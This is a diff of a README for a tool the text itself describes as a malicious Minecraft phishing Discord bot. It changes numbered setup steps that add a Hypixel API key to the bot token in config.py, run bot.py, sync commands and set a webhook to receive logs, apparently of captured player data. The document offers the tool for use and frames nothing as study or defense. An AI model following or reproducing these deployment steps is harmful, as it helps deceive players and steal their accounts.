@@ -8,12 +8,13 @@ A Minecraft phishing Discord bot is a malicious program designed to deceive play
 ## How to run
   (Python Download- https://www.python.org/downloads/release/python-31012/)  
   1.Make your bot token and give it ALL intents  
-  2.Put the token in config.py  
-  3.Put your discord id in self.admins = [YOUR DISCORD ID]  
-  4.Open CMD in the folder and type pip install -r requirements.txt  
-  5.Once that's finished run in cmd, python bot.py  
-  6.Then in your server type !sync global  
-  7.After that do /webhook and enter where you want your logs to go
+  2.Go to https://developer.hypixel.net/dashboard and copy your API key
+  3.Put the token and api key in config.py  
+  4.Put your discord id in self.admins = [YOUR DISCORD ID]  
+  5.Open CMD in the folder and type pip install -r requirements.txt  
+  6.Once that's finished run in cmd, python bot.py  
+  7.Then in your server type !sync global  
+  8.After that do /webhook and enter where you want your logs to go
 
 
 # What it looks like:
